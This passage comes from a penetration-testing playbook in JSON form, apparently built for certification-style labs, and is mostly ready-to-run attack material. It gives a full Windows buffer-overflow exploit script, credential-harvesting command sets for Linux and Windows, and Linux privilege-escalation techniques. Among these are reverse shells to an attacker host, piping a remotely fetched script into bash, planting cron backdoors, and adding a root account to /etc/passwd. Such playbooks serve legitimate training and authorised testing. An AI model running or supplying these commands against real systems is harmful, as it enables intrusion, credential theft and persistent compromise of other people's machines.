exploit\nnc -nlvp <PORT>\nrlwrap nc -nlvp <PORT>"
      }
    ],
    "brief_description": "Generate shellcode with EXITFUNC=thread to avoid crashing the parent process. Verify no bad chars in output."
  },
  {
    "id": "item-bof-7",
    "phase": "6. Buffer Overflow (Windows x86 Stack BOF)",
    "step": "6.7 Build & Execute Final Exploit",
    "title": "Assemble and fire the final exploit",
    "feasible_when": "Offset, bad characters, JMP ESP address, and shellcode are all confirmed. Listener is running.",
    "snippets": [
      {
        "lang": "python",
        "code": "#!/usr/bin/env python3\n# exploit.py — final BOF exploit\nimport socket\n\nip     = \"<TARGET_IP>\"\nport   = <PORT>\nprefix = b\"<COMMAND> \"         # e.g. b\"OVERFLOW1 \"\noffset = <EXACT_OFFSET>        # from pattern_offset\n\n# JMP ESP address — little-endian byte order\n# Example: 0x625011AF → b\"\\xAF\\x11\\x50\\x62\"\nretn = b\"\\x<B4>\\x<B3>\\x<B2>\\x<B1>\"   # JMP ESP address LE\n\n# NOP sled (16-32 bytes) — gives decoder room to run\nnops = b\"\\x90\" * 16\n\n# Paste msfvenom -f py output here\nshellcode = (\n    b\"\\x<SHELLCODE_BYTES>\"\n    # ... paste full shellcode here\n)\n\n# Total payload construction\npadding = b\"C\" * (3000 - len(prefix) - offset - len(retn) - len(nops) - len(shellcode))\nbuffer  = prefix + b\"A\" * offset + retn + nops + shellcode + padding\n\nprint(f\"[*] Payload total: {len(buffer)} bytes\")\nprint(f\"[*] Offset: {offset}\")\nprint(f\"[*] RETN: {retn.hex()}\")\nprint(f\"[*] NOPs: {len(nops)}\")\nprint(f\"[*] Shellcode: {len(shellcode)} bytes\")\n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.settimeout(10)\n    s.connect((ip, port))\n    s.recv(1024)\n    print(\"[*] Sending exploit...\")\n    s.send(buffer + b\"\\r\\n\")\n    print(\"[+] Done — check listener!\")"
      },
      {
        "lang": "bash",
        "code": "# Pre-flight checklist\n# 1. Listener is running: rlwrap nc -nlvp <PORT>\n# 2. Target service is running and not crashed\n# 3. Immunity debugger NOT paused (remove breakpoints for live run)\n# 4. LHOST/LPORT in shellcode match listener\n\n# Fire\npython3 exploit.py\n\n# Debugging tips if shell not received:\n# — Add breakpoint at JMP ESP address and trace execution\n# — Check NOP sled: ESP - 16 should land in NOPs\n# — Try larger NOP sled (32-64 bytes)\n# — Verify retn bytes are in correct little-endian order\n# — Check shellcode for bad chars again\n# — Try different exit function: EXITFUNC=seh or process\n# — Confirm listener port matches LPORT in shellcode"
      }
    ],
    "brief_description": "Final structure: padding + EIP (JMP ESP LE) + NOP sled + shellcode. Always verify listener is running before firing."
  },

  // ============================================================
  // PHASE 7 — POST-EXPLOITATION
  // ============================================================
  {
    "id": "item-post-1",
    "phase": "7. Post-Exploitation",
    "step": "7.1 Situational Awareness — Linux",
    "title": "Comprehensive Linux situational awareness",
    "feasible_when": "A shell (any privilege level) has been obtained on a Linux target.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Identity & system ───\nid; whoami; groups\nhostname; uname -a\ncat /etc/os-release; cat /proc/version\ncat /proc/cpuinfo | grep 'model name' | head -1\nfree -h; df -h\n\n# ─── Network ───\nip a; ip route; ip neigh\ncat /etc/hosts\ncat /etc/resolv.conf\nss -tulnp\nnetstat -antup 2>/dev/null\narp -n\n\n# ─── Users & sessions ───\ncat /etc/passwd | grep -vE 'nologin|false|sync|shutdown|halt|daemon'\ncat /etc/group\nlast -20\nw; who\n\n# ─── Sudo & capabilities ───\nsudo -l 2>/dev/null\nsudo -V 2>/dev/null\ngetcap -r / 2>/dev/null\n\n# ─── Processes ───\nps auxf\nps aux | grep -vE '\\[|grep'\ntop -bn1 | head -20\n\n# ─── Cron & scheduled tasks ───\ncat /etc/crontab\nls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null\ncrontab -l 2>/dev/null\ncat /var/spool/cron/crontabs/* 2>/dev/null\nsystemctl list-timers --all 2>/dev/null\n\n# ─── Interesting files & mounts ───\ndf -h; mount\ncat /proc/mounts\nfind / -name 'local.txt' -o -name 'proof.txt' -o -name 'flag.txt' 2>/dev/null\nfind / -name '.bash_history' 2>/dev/null\nls -la /home/; ls -la /root/ 2>/dev/null\n\n# ─── Open files & sockets ───\nlsof -i 2>/dev/null\nlsof -nP 2>/dev/null | grep LISTEN\n\n# ─── Environment & paths ───\nenv; echo $PATH\necho $LD_PRELOAD\ncat /etc/environment 2>/dev/null\ncat /etc/ld.so.conf 2>/dev/null"
      }
    ],
    "brief_description": "Run all of this immediately after landing a shell — map identity, network, users, cron, and file structure before any enumeration tool."
  },
  {
    "id": "item-post-2",
    "phase": "7. Post-Exploitation",
    "step": "7.1 Situational Awareness — Windows",
    "title": "Comprehensive Windows situational awareness",
    "feasible_when": "A shell (any privilege level) has been obtained on a Windows target.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Identity ───\nwhoami\nwhoami /all                          # groups + privileges\nwhoami /priv                         # token privileges\nnet user %username% 2>$null\n\n# ─── System info ───\nhostname\nsysteminfo                           # OS, patches, domain, uptime\n[System.Environment]::OSVersion\n$env:COMPUTERNAME; $env:USERDOMAIN; $env:USERNAME\n\n# ─── Patch level ───\nwmic qfe list brief | sort\nGet-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20\n\n# ─── Network ───\nipconfig /all\nroute print\nnetstat -ano\nnet use\nnet share\narp -a\nnslookup <DOMAIN>\n\n# ─── Users & groups ───\nnet user\nnet localgroup administrators\nnet localgroup 'Remote Desktop Users'\nnet localgroup 'Backup Operators'\nnet localgroup\nGet-LocalUser | Select Name,Enabled,LastLogon\nGet-LocalGroupMember Administrators\n\n# ─── Domain info (if domain joined) ───\nnet config workstation\nnet group 'Domain Admins' /domain 2>$null\nnet accounts /domain 2>$null\n$env:USERDNSDOMAIN\n\n# ─── Processes ───\nGet-Process | Sort-Object CPU -Descending | Select -First 20\ntasklist /svc\nGet-CimInstance Win32_Service | Where-Object { $_.State -eq 'Running' } | Select Name,PathName,StartMode\n\n# ─── Installed software ───\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName,DisplayVersion | Sort DisplayName\nGet-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName,DisplayVersion | Sort DisplayName\n\n# ─── Services ───\nGet-Service | Where-Object { $_.Status -eq 'Running' } | Select Name,DisplayName\nsc query type= all state= all\n\n# ─── Firewall ───\nnetsh advfirewall show allprofiles\nnetsh firewall show state\n\n# ─── Environment ───\nSet\nGet-ChildItem Env: | Sort Name\n[System.Environment]::GetEnvironmentVariables()\n\n# ─── Interesting files ───\nGet-ChildItem C:\\Users\\*\\Desktop\\ -ErrorAction SilentlyContinue\nGet-ChildItem C:\\Users\\*\\Documents\\ -ErrorAction SilentlyContinue\nGet-ChildItem C:\\inetpub\\ -ErrorAction SilentlyContinue\nGet-ChildItem C:\\xampp\\ -ErrorAction SilentlyContinue\nGet-ChildItem C:\\wamp\\ -ErrorAction SilentlyContinue"
      }
    ],
    "brief_description": "Collect systeminfo and whoami /all immediately — OS version determines kernel exploits, privileges determine Potato attacks."
  },
  {
    "id": "item-post-3",
    "phase": "7. Post-Exploitation",
    "step": "7.2 Credential Harvesting — Linux",
    "title": "Comprehensive Linux credential hunting",
    "feasible_when": "A shell has been obtained on a Linux target (any privilege level; more files accessible as root).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── /etc/shadow & passwd ───\ncat /etc/shadow 2>/dev/null\ncat /etc/passwd\nunshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt\n\n# ─── SSH keys ───\nfind / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null\nfind / -name 'authorized_keys' 2>/dev/null\ncat ~/.ssh/known_hosts 2>/dev/null\ncat ~/.ssh/config 2>/dev/null\n\n# ─── Shell history ───\ncat ~/.bash_history 2>/dev/null\ncat ~/.zsh_history 2>/dev/null\ncat ~/.fish_history 2>/dev/null\ncat /home/*/.bash_history 2>/dev/null\ncat /root/.bash_history 2>/dev/null\ngrep -i 'pass\\|ssh\\|curl\\|wget\\|mysql\\|ftp\\|scp' ~/.bash_history 2>/dev/null\n\n# ─── Config files ───\nfind / -name '*.conf' -o -name '*.config' -o -name '*.cfg' -o -name '*.ini' -o -name '*.env' -o -name '*.yaml' -o -name '*.yml' 2>/dev/null \\\n  | xargs grep -lsi 'password\\|passwd\\|secret\\|token\\|apikey\\|api_key\\|db_pass\\|dbpassword' 2>/dev/null | head -30\n\n# ─── Web app configs ───\ncat /var/www/html/wp-config.php 2>/dev/null\ncat /var/www/html/.env 2>/dev/null\ncat /var/www/html/config/database.yml 2>/dev/null\nfind /var/www/ /opt/ /srv/ /home/ -name '*.php' -exec grep -l 'DB_PASSWORD\\|mysql_connect\\|\\$password' {} \\; 2>/dev/null | head -10\nfind /var/www/ /opt/ /srv/ /home/ -name '.env' 2>/dev/null -exec cat {} \\;\nfind /var/www/ /opt/ /srv/ /home/ -name 'settings.py' 2>/dev/null -exec grep -i 'password\\|secret' {} \\;\nfind /var/www/ /opt/ /srv/ /home/ -name 'config.php' 2>/dev/null -exec cat {} \\;\n\n# ─── Database credentials ───\nfind / -name '*.sql' -o -name '*.sqlite' -o -name '*.db' 2>/dev/null | head -10\ncat /etc/mysql/my.cnf 2>/dev/null\nfind / -name 'my.cnf' -o -name 'my.ini' 2>/dev/null | xargs grep -i 'password' 2>/dev/null\n\n# ─── KeePass & credential stores ───\nfind / -name '*.kdbx' -o -name '*.kdb' 2>/dev/null\nfind / -name '*.pfx' -o -name '*.p12' -o -name '*.key' 2>/dev/null\n\n# ─── Interesting file search ───\ngrep -rli 'password\\|passwd\\|api_key\\|secret\\|credential' /etc/ /opt/ /var/www/ /home/ /srv/ /tmp/ 2>/dev/null | head -20\nfind / -newer /tmp -type f 2>/dev/null | grep -vE 'proc|sys|dev|run' | head -20\nfind / -maxdepth 5 -name '*.bak' -o -name '*.old' -o -name '*.orig' -o -name '*.backup' 2>/dev/null | head -20"
      }
    ],
    "brief_description": "Always check /etc/shadow, bash_history, SSH keys, and web config files. Hash every cleartext password found for reuse."
  },
  {
    "id": "item-post-4",
    "phase": "7. Post-Exploitation",
    "step": "7.2 Credential Harvesting — Windows",
    "title": "Comprehensive Windows credential hunting",
    "feasible_when": "A shell has been obtained on a Windows target (any privilege level).",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Registry creds ───\nreg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' 2>$null\nreg query 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP' 2>$null\nreg query 'HKCU\\Software\\SimonTatham\\PuTTY\\Sessions' /s 2>$null     # PuTTY saved sessions\nreg query 'HKCU\\Software\\ORL\\WinVNC3\\Password' 2>$null\nreg query 'HKLM\\SOFTWARE\\RealVNC\\WinVNC4' /v password 2>$null\nreg query 'HKCU\\Software\\TightVNC\\Server' 2>$null\nreg query 'HKLM\\SOFTWARE\\Microsoft\\Windows CE Services' /v PocketPCPath 2>$null\n\n# ─── Stored Windows credentials ───\ncmdkey /list\n\n# ─── PowerShell history ───\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>$null\nGet-Content (Get-PSReadLineOption).HistorySavePath 2>$null\n\n# ─── Unattend / sysprep files ───\ntype C:\\Windows\\Panther\\Unattend.xml 2>$null\ntype C:\\Windows\\Panther\\Unattend\\Unattend.xml 2>$null\ntype C:\\Windows\\sysprep\\sysprep.xml 2>$null\ntype C:\\Windows\\sysprep\\sysprep.inf 2>$null\ntype C:\\Windows\\system32\\sysprep\\unattend.xml 2>$null\ntype C:\\Windows\\system32\\sysprep.inf 2>$null\n\n# ─── IIS / web app configs ───\ntype C:\\inetpub\\wwwroot\\web.config 2>$null\ntype C:\\inetpub\\wwwroot\\connectionStrings.config 2>$null\nGet-ChildItem -Path C:\\inetpub -Recurse -Include *.config,*.xml -ErrorAction SilentlyContinue | Select-String -Pattern 'password|connectionString' 2>$null\nGet-ChildItem -Path C:\\xampp,C:\\wamp,C:\\Apache24 -Recurse -Include *.php,*.ini,*.conf -ErrorAction SilentlyContinue | Select-String 'password|DB_PASS' 2>$null\n\n# ─── File search ───\nGet-ChildItem C:\\ -Recurse -Include *pass*,*cred*,*secret*,*.vnc,*.kdbx,*config* -ErrorAction SilentlyContinue 2>$null\nGet-ChildItem C:\\ -Recurse -Include *.xml,*.ini,*.txt,*.config -ErrorAction SilentlyContinue | Select-String -Pattern 'password' 2>$null | Select-Object -First 30\nfindstr /si /m 'password' C:\\*.xml C:\\*.ini C:\\*.txt C:\\*.cfg C:\\*.config 2>nul\n\n# ─── DPAPI blobs ───\nGet-ChildItem -Path \"$env:APPDATA\\Microsoft\\Credentials\" -Force 2>$null\nGet-ChildItem -Path \"$env:LOCALAPPDATA\\Microsoft\\Credentials\" -Force 2>$null\nGet-ChildItem -Path \"$env:APPDATA\\Microsoft\\Protect\" -Recurse -Force 2>$null\n\n# ─── Wi-Fi passwords ───\nnetsh wlan show profiles 2>$null\nnetsh wlan show profiles name='<SSID>' key=clear 2>$null\nforeach ($profile in (netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_.Line -replace '.*:\\s*','' })) { netsh wlan show profile name=$profile key=clear }\n\n# ─── Browser credential files ───\nGet-ChildItem \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\" -Recurse -Include logins.json,key4.db 2>$null\nGet-ChildItem \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\" -Include 'Login Data' 2>$null\n\n# ─── SAM / SYSTEM backup ───\ndir C:\\Windows\\Repair\\SAM 2>$null\ndir C:\\Windows\\System32\\config\\RegBack\\ 2>$null\ndir C:\\Windows\\Temp\\*.hiv 2>$null"
      }
    ],
    "brief_description": "Always check Winlogon registry, PowerShell history, unattend files, IIS web.config, and SAM backups first."
  },

  // ============================================================
  // PHASE 8 — PRIVILEGE ESCALATION: LINUX
  // ============================================================
  {
    "id": "item-linpe-1",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.1 Automated Enumeration",
    "title": "Transfer and run automated PrivEsc enumeration scripts",
    "feasible_when": "A shell has been obtained on a Linux target and file transfer to the target is possible.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Transfer methods ───\n# HTTP\npython3 -m http.server 80    # on attacker\nwget http://<ATTACKER_IP>/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh\ncurl http://<ATTACKER_IP>/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh\n\n# SCP\nscp linpeas.sh user@<TARGET_IP>:/tmp/lp.sh\n\n# Base64 (fallback — no network tools needed)\nbase64 -w0 linpeas.sh    # on attacker, copy output\necho '<BASE64_OUTPUT>' | base64 -d > /tmp/lp.sh && chmod +x /tmp/lp.sh\n\n# ─── LinPEAS (most comprehensive) ───\nbash /tmp/lp.sh | tee /tmp/linpeas_out.txt\nbash /tmp/lp.sh -a   # all checks including network scans\nbash /tmp/lp.sh -q   # quiet mode (less output)\n# Colors: Red/Yellow = high priority findings\n\n# In-memory (no file written)\ncurl -sL http://<ATTACKER_IP>/linpeas.sh | bash\n\n# ─── Linux Smart Enumeration (lse.sh) ───\nbash /tmp/lse.sh -l 2 -i   # level 2 verbose, no headers\nbash /tmp/lse.sh -c         # color output\n\n# ─── Linux Exploit Suggester ───\nbash /tmp/les.sh\nbash /tmp/les.sh --uname \"$(uname -r)\"\nbash /tmp/les2.sh           # alternative version\n\n# ─── pspy (process monitor — no root required) ───\nchmod +x /tmp/pspy64\n/tmp/pspy64 -pf -i 1000    # show processes + file events, 1s interval\n# Watch for 1-2 minutes for cron jobs, scheduled tasks\n# Look for: UID=0 processes, file writes to /tmp, script executions\n\n# ─── linuxprivchecker ───\npython3 /tmp/linuxprivchecker.py 2>/dev/null\npython /tmp/linuxprivchecker.py 2>/dev/null\n\n# ─── unix-privesc-check ───\nbash /tmp/unix-privesc-check standard 2>/dev/null\nbash /tmp/unix-privesc-check detailed 2>/dev/null"
      }
    ],
    "brief_description": "Run LinPEAS first — highlights critical findings in red. Always also run pspy for 1-2 minutes to catch root cron jobs."
  },
  {
    "id": "item-linpe-2",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.2 Kernel Exploits",
    "title": "Identify and exploit kernel vulnerabilities",
    "feasible_when": "A low-privilege shell is available on Linux; kernel version is known from `uname -a`.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Gather kernel info ───\nuname -a\nuname -r\ncat /proc/version\ncat /etc/os-release\nlsb_release -a 2>/dev/null\n\n# ─── Linux Exploit Suggester ───\n./les.sh\n./les.sh --uname \"$(uname -r)\"\n./les2.sh -k $(uname -r)\n\n# ─── Searchsploit ───\nsearchsploit linux kernel $(uname -r | cut -d'-' -f1)\nsearchsploit ubuntu $(lsb_release -rs 2>/dev/null)\nsearchsploit debian $(lsb_release -rs 2>/dev/null)\n\n# ─── Notable kernel exploits by version ───\n\n# DirtyCow (CVE-2016-5195) — kernel 2.6.22 to 4.8.3, very reliable\ngcc -pthread dirty.c -o dirty -lcrypt\n./dirty <NEW_ROOT_PASS>\n# Or cowroot variant: https://github.com/firefart/dirtycow\n\n# DirtyPipe (CVE-2022-0847) — kernel 5.8 to 5.16.11\ngcc -o dirtypipe dirtypipe.c\n./dirtypipe /etc/passwd   # or target SUID binary\n\n# Polkit CVE-2021-4034 (pkexec) — present on most distros until 2022\ngcc -shared -fPIC -o evil.so evil.c\n./poc\n# Check: dpkg -l policykit-1 | grep -i version\n\n# Sudo baron samedit CVE-2021-3156 — sudo < 1.9.5p2\nsudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')\n# Check: sudo -V | head -1\n\n# eBPF CVE-2021-3490 — kernel < 5.12\n# PTRACE_TRACEME CVE-2019-13272 — kernel < 5.1.17\n# overlayfs CVE-2021-3493 — Ubuntu specific < 5.11\n# snap-confine CVE-2022-3328 — Ubuntu\n# nftables CVE-2022-32250 — kernel 5.12 to 5.18\n# netfilter CVE-2023-32233 — kernel 6.1\n\n# ─── Compile on target ───\ngcc -o exploit exploit.c 2>/dev/null || g++ -o exploit exploit.cpp\n# If no gcc, compile on attacker with same architecture:\ngcc -m32 -o exploit exploit.c   # 32-bit\ngcc -o exploit exploit.c         # 64-bit\n# Transfer binary via wget/curl\n\n# ─── Check SMEP/SMAP (kernel mitigations) ───\ngrep -i 'smep\\|smap' /proc/cpuinfo\ncat /proc/sys/kernel/perf_event_paranoid\ncat /sys/kernel/security/lsm"
      }
    ],
    "brief_description": "Map kernel version to CVEs using les.sh. DirtyCow, DirtyPipe, and Polkit cover a wide range of kernel versions."
  },
  {
    "id": "item-linpe-3",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.3 SUID / SGID Binaries",
    "title": "Find and exploit SUID/SGID misconfigured binaries",
    "feasible_when": "A low-privilege shell has been obtained on a Linux target.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Find SUID ───\nfind / -perm -4000 -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\nfind / -perm /4000 -type f 2>/dev/null\n\n# ─── Find SGID ───\nfind / -perm -2000 -type f 2>/dev/null\n\n# ─── Find both SUID and SGID ───\nfind / -perm /6000 -type f 2>/dev/null\n\n# ─── Always check against GTFOBins: https://gtfobins.github.io/ ───\n\n# ─── SUID exploitation examples ───\n\n# find\nfind . -exec /bin/sh -p \\; -quit\n\n# vim / vi / nano\nvim -c ':!/bin/sh -p'\nnano  → Ctrl+R Ctrl+X → reset; sh 1>&0 2>&0\n\n# bash / sh (SUID)\nbash -p\n/bin/sh -p\n\n# python / python3\npython3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\npython -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n\n# perl\nperl -e 'exec \"/bin/sh\";'\nperl -e 'use POSIX; POSIX::setuid(0); exec \"/bin/bash\";'\n\n# nmap (< v5.21 — interactive mode)\nnmap --interactive\nnmap> !sh\n\n# env\nenv /bin/sh -p\n\n# awk / gawk\nawk 'BEGIN {system(\"/bin/sh -p\")}'\n\n# less / more\nless /etc/passwd\n!/bin/sh\n\n# tail (via GTFOBins)\n# cp\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n/tmp/rootbash -p\n\n# dd — read root files\ndd if=/etc/shadow of=/tmp/shadow\n\n# tee — write to root-owned files\necho '<content>' | tee /etc/cron.d/backdoor\n\n# xxd — read files\nxxd /etc/shadow | xxd -r\n\n# base64 — read files\nbase64 /root/.ssh/id_rsa | base64 -d\n\n# openssl\nopenssl enc -in /etc/shadow\n\n# systemctl (enable custom service)\ncat > /tmp/root.service << 'EOF'\n[Unit]\nDescription=root\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl link /tmp/root.service\nsystemctl enable --now root.service\n\n# strace (SUID strace → read files)\nstrace -o /dev/null /bin/id\n\n# wget — overwrite files as root\nwget -O /etc/cron.d/backdoor http://<ATTACKER_IP>/cron_payload"
      }
    ],
    "brief_description": "SUID binaries are the most common Linux PrivEsc — check every binary against GTFOBins. Especially find, vim, python, perl, awk."
  },
  {
    "id": "item-linpe-4",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.4 Sudo Misconfigurations",
    "title": "Check and exploit sudo permissions",
    "feasible_when": "A shell with a valid user account is available; `sudo -l` can be run with or without a password.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Check sudo ───\nsudo -l\nsudo -V\n# sudo -l shows: (ALL:ALL) NOPASSWD: ALL → instant root\n# sudo -l shows: (ALL) NOPASSWD: /usr/bin/vim → exploit that binary\n\n# ─── GTFOBins sudo escapes ───\n\n# vim\nsudo vim -c ':!/bin/bash'\nsudo vim -c ':py3 import pty; pty.spawn(\"/bin/bash\")'\n\n# nano\nsudo nano\nCtrl+R → Ctrl+X → reset; bash 1>&0 2>&0\n\n# less\nsudo less /etc/shadow\n!/bin/bash\n\n# awk\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n\n# find\nsudo find / -exec /bin/bash \\; -quit\n\n# python / python3\nsudo python3 -c 'import os; os.system(\"/bin/bash\")'\nsudo python -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# perl\nsudo perl -e 'exec \"/bin/bash\";'\n\n# ruby\nsudo ruby -e 'exec \"/bin/bash\"'\n\n# lua\nsudo lua -e 'os.execute(\"/bin/bash\")'\n\n# irb (Ruby interactive)\nsudo irb\nexec \"/bin/bash\"\n\n# env\nsudo env /bin/bash\n\n# man\nsudo man man\n!/bin/bash\n\n# more\nsudo more /etc/shadow\n!/bin/bash\n\n# ed\nsudo ed\n!/bin/bash\n\n# zip\nsudo zip /tmp/x.zip /tmp/x.txt -T --unzip-command='sh -c /bin/bash'\n\n# tar\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash\n\n# tcpdump\necho '/bin/bash' > /tmp/x.sh; chmod +x /tmp/x.sh\nsudo tcpdump -n -i lo -G1 -w /dev/null -z /tmp/x.sh\n\n# curl / wget (write to cron)\nsudo curl http://<ATTACKER_IP>/payload -o /etc/cron.d/backdoor\nsudo wget http://<ATTACKER_IP>/payload -O /etc/cron.d/backdoor\n\n# rsync\nsudo rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null\n\n# apache2 (read files)\nsudo apache2 -f /etc/shadow\n\n# ─── Sudo version exploits ───\n# CVE-2021-3156 baron samedit (sudo < 1.9.5p2)\nsudo -V | head -1\nsudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')\n# exploit: https://github.com/blasty/CVE-2021-3156\n\n# CVE-2019-14287 (sudo < 1.8.28 — run as arbitrary user)\nsudo -u#-1 /bin/bash\nsudo -u#4294967295 /bin/bash\n\n# CVE-2019-18634 (sudo < 1.8.26 — pwfeedback stack overflow)\npython3 -c 'print(\"A\"*512)' | sudo -S -k /bin/bash"
      }
    ],
    "brief_description": "`sudo -l` is the first check on any Linux shell. NOPASSWD entries — even for restrictive binaries — almost always have GTFOBins escapes."
  },
  {
    "id": "item-linpe-5",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.5 Cron Jobs",
    "title": "Enumerate and abuse cron jobs and scheduled tasks",
    "feasible_when": "A low-privilege shell is available; cron scripts are writable, run from writable directories, or the PATH can be hijacked.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Enumerate cron ───\ncat /etc/crontab\ncat /etc/cron.d/*\nls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/\ncrontab -l 2>/dev/null\ncat /var/spool/cron/crontabs/* 2>/dev/null\n\n# Systemd timers\nsystemctl list-timers --all\nfind / -name '*.timer' 2>/dev/null | xargs cat\n\n# ─── pspy — watch for root cron jobs ───\n./pspy64 -pf -i 500    # 500ms polling, show filesystem events\n# Watch for processes with UID=0\n# Common patterns: python script, bash script, binary in /tmp\n\n# ─── Exploiting writable cron scripts ───\n# Identify script path from /etc/crontab\nls -la /path/to/cron_script.sh\n# If writable:\necho 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/cron_script.sh\n# Wait for cron execution\n/tmp/rootbash -p   # -p preserves EUID\n\n# Or inject reverse shell\necho \"bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\" >> /path/to/cron_script.sh\n\n# ─── Exploiting writable directory in cron PATH ───\n# /etc/crontab PATH variable: PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n# If cron runs: make_report (relative, no full path)\n# And /usr/local/bin is writable:\ncat > /usr/local/bin/make_report << 'EOF'\n#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\nEOF\nchmod +x /usr/local/bin/make_report\n\n# ─── Wildcard injection (tar, chown, rsync in cron) ───\n# If cron runs: tar czf /backup/*.tar.gz /var/www/* (as root, and /var/www/ is writable)\necho '' > '--checkpoint=1'\necho '' > '--checkpoint-action=exec=sh /tmp/r.sh'\ncat > /tmp/r.sh << 'EOF'\n#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\nEOF\nchmod +x /tmp/r.sh\n\n# If cron runs: chown root:root * (in writable dir)\ntouch '--reference=/tmp/exploit'\n\n# If cron runs: rsync -a * dest/ (in writable dir)\necho '' > '-e sh r.sh'\necho '#!/bin/bash\\nchmod +s /bin/bash' > r.sh\nchmod +x r.sh\n\n# ─── Writable script sourced by cron ───\n# Check cron script for 'source' or '.' commands\ngrep -r 'source\\|\\.' /etc/cron.d/ /etc/crontab /etc/cron.hourly/ 2>/dev/null\n# If sourced file is writable, inject payload there"
      }
    ],
    "brief_description": "Run pspy for 2+ minutes to reveal all root cron jobs. Check writable scripts, wildcard abuse, and PATH hijacking."
  },
  {
    "id": "item-linpe-6",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.6 Writable Files and Passwd/Shadow",
    "title": "World-writable files, /etc/passwd, sudoers, and shadow write access",
    "feasible_when": "A low-privilege shell is available and critical system files or directories are writable.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Find writable directories ───\nfind / -writable -type d 2>/dev/null | grep -vE 'proc|sys|dev|run'\n\n# ─── Find writable files ───\nfind / -writable -type f 2>/dev/null | grep -vE 'proc|sys|dev|run'\n\n# ─── Find writable files in /etc ───\nfind /etc -writable -type f 2>/dev/null\nls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab 2>/dev/null\n\n# ─── Writable /etc/passwd ───\nls -la /etc/passwd\n# If writable:\n# Generate password hash\nopenssl passwd -1 -salt hacked 'password123'        # MD5 — $1$hacked$...\nopenssl passwd -6 -salt hacked 'password123'        # SHA-512 — $6$hacked$...\nopenssl passwd 'password123'                         # DES — simplest\npython3 -c 'import crypt; print(crypt.crypt(\"password123\", \"$6$hacked\"))'\n\n# Add root user (uid=0, gid=0)\necho 'hacked:$1$hacked$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacked    # password: password123\n\n# Overwrite root password hash (if current root hash is 'x' pointing to shadow)\n# First check: grep root /etc/passwd → if field 2 is 'x', hash is in shadow\n# Replace 'x' with direct hash:\ncp /etc/passwd /tmp/passwd.bak\nawk -F: '{if($1==\"root\") $2=\"$(openssl passwd password123)\"; print}' OFS=':' /etc/passwd > /tmp/passwd.new\ncp /tmp/passwd.new /etc/passwd\nsu root    # password: password123\n\n# ─── Writable /etc/sudoers ───\nls -la /etc/sudoers\nls -la /etc/sudoers.d/*\n# If writable:\necho 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\necho '<CURRENT_USER> ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\n\n# ─── Writable /etc/shadow ───\nhashcat -m 1800 '$6$...' /usr/share/wordlists/rockyou.txt  # crack root hash\n# Or generate new hash and replace\nopenssl passwd -6 -salt abc 'password123'\n# Edit /etc/shadow and replace root's hash\nsu root   # password: password123\n\n# ─── World-writable /sbin /usr/bin ───\nls -la /usr/bin/sudo\nls -la /usr/bin/passwd\n# If writable — replace with reverse shell or setuid binary\n\n# ─── Find files owned by root and writable by current user ───\nfind / -user root -writable -type f 2>/dev/null | grep -vE 'proc|sys'"
      }
